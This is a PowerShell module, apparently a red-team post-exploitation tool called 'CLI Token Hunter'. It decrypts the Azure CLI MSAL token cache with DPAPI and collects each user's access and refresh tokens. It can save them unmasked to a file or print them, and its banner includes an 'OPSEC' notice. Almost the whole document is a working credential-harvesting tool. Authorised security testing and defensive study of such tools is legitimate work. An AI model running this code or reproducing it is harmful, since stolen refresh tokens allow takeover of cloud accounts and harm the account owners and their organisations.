


# Enumerates MSAL tokens from the Azure CLI cache
function Invoke-CLITokenHunter {
    [CmdletBinding()]
   param(
    [string]$MSALCache,
    [switch]$Unmasked,                           
    [string]$SessionVarName = 'CLITokenHunterResults',  
    [string]$OutFile,                              
    [ValidateSet('JSON','CSV')]
    [string]$OutFormat = 'JSON'                    
)

# helper: mask long secrets in output 
function Mask-Secret {
    param(
        [Parameter(Mandatory=$true)][AllowNull()][string]$Value,
        [int]$KeepStart = 6,
        [int]$KeepEnd   = 6
    )
    if ([string]::IsNullOrEmpty($Value)) { return $Value }
    if ($Value.Length -le ($KeepStart + $KeepEnd)) { return ('*' * $Value.Length) }
    $start = $Value.Substring(0, $KeepStart)
    $end   = $Value.Substring($Value.Length - $KeepEnd)
    return "$start...$end"
}


#  top banner function
function Show-Banner {
    param(
        [Parameter(Mandatory)]
        [string]$CachePath,

        [Parameter(Mandatory)]
        [bool]$UsingDPAPI
    )

    $name    = 'CLI Token Hunter'
    $version = 'v1.0'
    $tsUtc   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss 'UTC'")
    $author  = 'Edrian Miranda - Obikuro'
    $psver   = $PSVersionTable.PSVersion.ToString()

    $rule = ('=' * 72)

    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ("{0} {1}" -f $name, $version) -ForegroundColor Magenta
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ("[*] Time (UTC)   : {0}" -f $tsUtc) -ForegroundColor Cyan
    Write-Host ("[*] Author       : {0}" -f $author) -ForegroundColor Cyan
    Write-Host ("[*] PowerShell   : {0}" -f $psver) -ForegroundColor Cyan
    Write-Host ("[*] Cache Path   : {0}" -f $CachePath) -ForegroundColor Cyan
    Write-Host ("[*] DPAPI        : {0}" -f $UsingDPAPI) -ForegroundColor Cyan
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host "[!] OPSEC: No file output in this step (pipeline only)." -ForegroundColor Cyan
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ""
}


# MSALCache DIR Path 

if ([string]::IsNullOrEmpty($MSALCache)) {
    switch ([System.Environment]::OSVersion.Platform) {
        'Unix' {                  
            $MSALCache = "$HOME/.azure/msal_token_cache.json"
            break
        }
        'MacOSX' {               
            $MSALCache = "$HOME/.azure/msal_token_cache.json"
            break
        }
        default {                 # Windows (Win32NT)
            $MSALCache = "$env:HOMEDRIVE$env:HOMEPATH\.Azure\msal_token_cache.bin"
            $DPAPI     = $true 
            break
        }
    }
}

# calling banner 
if (-not $DPAPI) { $DPAPI = $false }  
Show-Banner -CachePath $MSALCache -UsingDPAPI:$DPAPI



# Helper: reads file bytes

function Get-BinaryContent {
    param(
        [parameter(Mandatory=$true, ValueFromPipeline, Position=0)]
        [string]$Path
    )
    Process
    {
        
        if($PSVersionTable.PSVersion.Major -ge 6)
        {
            Get-Content -Path $Path -AsByteStream -Raw -ErrorAction $ErrorActionPreference
        }
        else
        {
            Get-Content -Path $Path -Encoding Byte -ErrorAction $ErrorActionPreference
        }
    }
}

# Helper: converts MSAL cache entry text (e.g., "@{name=val; ...}") into a PSObject (ordered properties).


function Parse-ObjectDefinition {
            Param(
                [Parameter(Mandatory=$True)]
                [String]$Definition
            )
            Process
            {
                
                $Definition = $Definition.Substring($Definition.IndexOf("@"))

                
                $Definition = $Definition.Substring(2,$Definition.Length-3)

                $attributes = [ordered]@{}
                if(-not [string]::IsNullOrEmpty($Definition))
                {
                   
                    $properties = $Definition.Split("; ")

                    
                    foreach($property in $properties)
                    {
                        
                        $parts = $property.Split("=")
                        if(-not [string]::IsNullOrEmpty($parts[0]))
                        {
                            $attributes[$parts[0]] = $parts[1]
                        }
                    }
                }

                return New-Object -TypeName psobject -Property $attributes
            } }

# helper: normalizes MSAL "target" (scope list) by collapsing whitespace.
            
function Normalize-Target {
    param([string]$t)
    if ([string]::IsNullOrWhiteSpace($t)) { return "" }
    
    return (($t -split '\s+' -ne '' -join ' ').Trim())
}


# helper: converts epoch seconds to local time
function Convert-FromEpoch {
    param (
        [Parameter(Mandatory = $true)]
        [int64]$EpochTime
    )
    return [System.DateTimeOffset]::FromUnixTimeSeconds($EpochTime).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss")
}


# CORE DPAPI decrypt 

Add-Type -AssemblyName System.Security

$decTokens = Get-BinaryContent $MSALCache
$tokens = [text.encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($decTokens,$null,'CurrentUser'))

# $tokens


$objTokens = $tokens | ConvertFrom-Json




########################################


  # Index RefreshToken

$rtIndex = @{}

foreach ($rt in ($objTokens.RefreshToken | Get-Member -MemberType NoteProperty)) {
    $rtProps = Parse-ObjectDefinition -Definition $rt.Definition
    if ([string]::IsNullOrWhiteSpace($rtProps.home_account_id)) { continue }
    if ([string]::IsNullOrWhiteSpace($rtProps.client_id))       { continue }

    $normTarget = Normalize-Target $rtProps.target
    $key = '{0}|{1}|{2}' -f $rtProps.home_account_id, $rtProps.client_id, $normTarget
    $rtIndex[$key] = $rtProps
}


#  build user map from Account
$users = [ordered]@{}
foreach ($acct in ($objTokens.Account | Get-Member -MemberType NoteProperty)) {
    $acctProps = Parse-ObjectDefinition -Definition $acct.Definition
    if ($acctProps.home_account_id) { $users[$acctProps.home_account_id] = $acctProps.username }
}





# join AccessToken -> RefreshToken 
$access_tokens = @()

$nowSec = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()

foreach ($at in ($objTokens.AccessToken | Get-Member -MemberType NoteProperty)) {
    $atProps = Parse-ObjectDefinition -Definition $at.Definition

    
    if ([string]::IsNullOrWhiteSpace($atProps.home_account_id)) { continue }
    if ([string]::IsNullOrWhiteSpace($atProps.client_id))       { continue }

    $userName   = $users[$atProps.home_account_id]
    $normTarget = Normalize-Target $atProps.target

# ------- RT selection with 3-level fallback -------
$exactKey = '{0}|{1}|{2}' -f $atProps.home_account_id, $atProps.client_id, $normTarget
$rtProps  = $null

if ($rtIndex.ContainsKey($exactKey)) {
    
    $rtProps = $rtIndex[$exactKey]
} else {
   
    $prefixAC = '{0}|{1}|' -f $atProps.home_account_id, $atProps.client_id
    $rtProps = ($rtIndex.GetEnumerator() |
        Where-Object { $_.Key -like "$prefixAC*" } |
        Select-Object -First 1).Value

    if ($null -eq $rtProps) {
        # 3) any RT with same (account) regardless of client/target
        $prefixA = '{0}|' -f $atProps.home_account_id
        $rtProps = ($rtIndex.GetEnumerator() |
            Where-Object { $_.Key -like "$prefixA*" } |
            Select-Object -First 1).Value
    }
}

# Determine AT expiry strictly from expires_on 
$expSec = $null
if ($atProps.PSObject.Properties.Match('expires_on').Count -gt 0 -and $atProps.expires_on) {
    try {
        $expSec = [Int64]$atProps.expires_on
    } catch {
        try { $expSec = [Int64][double]$atProps.expires_on } catch { $expSec = $null }
    }
}

$expiresOnLocal = if ($expSec) { Convert-FromEpoch -EpochTime $expSec } else { $null }
$isExpired      = if ($expSec) { [bool]($expSec -le $nowSec) } else { $null }  # $null = unknown

# RT last_modification_time -> Local time string 
$rtLastModLocal = $null
if ($null -ne $rtProps -and $rtProps.PSObject.Properties.Match('last_modification_time').Count -gt 0 -and $rtProps.last_modification_time) {
    try {
        $rtLastModLocal = Convert-FromEpoch -EpochTime ([Int64]$rtProps.last_modification_time)
    } catch { $rtLastModLocal = $null }
}



  
$refresh = if ($null -ne $rtProps) { $rtProps.secret } else { $null }

$attributes = [ordered]@{
    UserName             = $userName
    access_token         = $atProps.secret
    AT_Expired           = $isExpired
    AT_ExpiresOnLocal    = $expiresOnLocal
    refresh_token        = $refresh
    RT_LastModifiedLocal = $rtLastModLocal
}



    $access_tokens += New-Object psobject -Property $attributes
}



# Make results available across the session in a global variable
if ([string]::IsNullOrWhiteSpace($SessionVarName)) { $SessionVarName = 'CLITokenHunterResults' }
Set-Variable -Name $SessionVarName -Value $access_tokens -Scope Global -Force
Write-Host ("[+] Results available in variable: {0} (count: {1})" -f $SessionVarName, ($access_tokens | Measure-Object).Count) -ForegroundColor Green


#  save to file 
if ($OutFile) {
    try {
        switch ($OutFormat) {
            'CSV' {
                $access_tokens | Export-Csv -Path $OutFile -NoTypeInformation -Force -Encoding UTF8
            }
            'JSON' {
                $access_tokens | ConvertTo-Json -Depth 6 | Out-File -FilePath $OutFile -Encoding UTF8 -Force
            }
        }
        Write-Host ("[+] Saved results to file: {0} ({1})" -f $OutFile, $OutFormat) -ForegroundColor Green
    } catch {
        Write-Host ("[!] Failed to save results to file: {0} - {1}" -f $OutFile, $_.Exception.Message) -ForegroundColor Yellow

    }
}

# Final display 

Write-Host "[+] Found Users:" -ForegroundColor Green
Write-Host "$($users.Values -Join ' <---> ')" 

# masked by default; full when -Unmasked is used
if ($Unmasked) {
    $CLITokenHunterResults |
      Select-Object UserName,
                    access_token,
                    AT_Expired, AT_ExpiresOnLocal,
                    refresh_token, RT_LastModifiedLocal |
      Format-List
}
else {
    $CLITokenHunterResults |
      Select-Object UserName,
        @{n='access_token';  e={ Mask-Secret $_.access_token }},
        AT_Expired, AT_ExpiresOnLocal,
        @{n='refresh_token'; e={ Mask-Secret $_.refresh_token }},
        RT_LastModifiedLocal |
      Format-Table -AutoSize
}





}


Export-ModuleMember -Function Invoke-CLITokenHunter